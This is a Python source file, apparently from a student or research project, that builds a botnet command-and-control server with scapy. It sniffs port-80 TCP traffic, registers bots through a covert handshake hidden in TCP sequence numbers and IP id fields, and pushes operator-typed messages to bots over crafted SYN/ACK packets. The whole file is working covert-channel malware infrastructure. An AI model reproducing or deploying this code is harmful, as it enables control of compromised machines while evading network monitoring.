from scapy.all import *
from threading import Thread
from random import randint
import sending


# Returns the 16 LSB of an integer
def L16(integer):
	return integer & 0xffff

# A hash that returns a 32 bit digest
def hash32(integer):
	sha1 = hashlib.sha1(format(integer, 'x'))
	return int(sha1.hexdigest(), 16) & 0xffffffff

# Our protocol. Implemented using scapy's Automata "framework". Statechart provided in docs.
class CNC(Automaton): # (C&N)

	def parse_args(self, **kargs):
		Automaton.parse_args(self, **kargs)
		self.newMsg = None		# message supplied by the user
		self.message = ''		# the message to send to our bots
		self.tokList = []		# our list of bot tokens

	# A predefined callback. Called every time a packet is sniffed. Filters out irrelevant packets.
	def master_filter(self, pkt):
		return (IP in pkt and TCP in pkt and pkt[TCP].dport == 80
				and not (pkt[TCP].flags & 4) and L16(pkt[TCP].seq) not in
				[L16(tok[0]) for tok in self.tokList if tok[1] == 2])

	# Sends a standard HTTP Syn/Ack (with no message inside)
	def send(self, ip, port, seq):
		send(IP(dst = ip, flags = 2, id = 0)
			/TCP(sport = 80, dport = port, flags = 18, seq = randint(0, 4294967295),
			ack = seq + 1, window = 29200, options = [("MSS", 1460)]))

	def getMsgCLI(self):
		self.newMsg = raw_input('')

	@ATMT.state(initial=1)
	def LISTENING(self):
		if self.newMsg:
			print 'Resetting token states'
			for tok in self.tokList:
				if tok[1] == 3:
					tok[1] = 1
			self.message = self.newMsg
			self.newMsg = None
		pass

	@ATMT.receive_condition(LISTENING, prio = 1)
	def check_for_ping(self, pkt):
		toksLSB = [L16(tok[0]) for tok in self.tokList]
		if L16(pkt[TCP].seq) in toksLSB:
			index = toksLSB.index(L16(pkt[TCP].seq))
			print 'Got PING with token ', self.tokList[index][0]
			self.tokList[index][0] = hash32(self.tokList[index][0])
			print 'Next expected token ', self.tokList[index][0]
			if (self.tokList[index][1] == 1):
				self.tokList[index][1] = 2
				sendATMT = sending.Sending(self.message, self.tokList, index, pkt[IP].src, pkt[TCP].sport)
				sendThread = Thread(target = sendATMT.run, args = ())
				sendThread.start()
				print 'Started new send thread'
			else:
				print 'Bot already recieved message'
				self.send(pkt[IP].src, pkt[TCP].sport, pkt[TCP].seq)
			raise self.LISTENING()

	@ATMT.receive_condition(LISTENING, prio = 2)
	def check_for_hello(self, pkt):
		newTok = hash32(pkt[TCP].seq)
		if L16(newTok) == pkt[IP].id:
			print 'HELLO received from ', pkt[IP].src
			self.tokList.append([newTok, 1])
			print 'Stored token ', newTok
			self.send(pkt[IP].src, pkt[TCP].sport, pkt[TCP].seq)
			raise self.LISTENING()

	@ATMT.receive_condition(LISTENING, prio = 3)
	def got_nothing(self, pkt):
		print 'Got fake PING from ', pkt[IP].src
		self.send(pkt[IP].src, pkt[TCP].sport, pkt[TCP].seq)
		raise self.LISTENING()


cnc = CNC()
print 'Enter first message:'
cnc.getMsgCLI()
cncThread = Thread(target = cnc.run, args = ())
cncThread.start()
while(True):
	cnc.getMsgCLI()
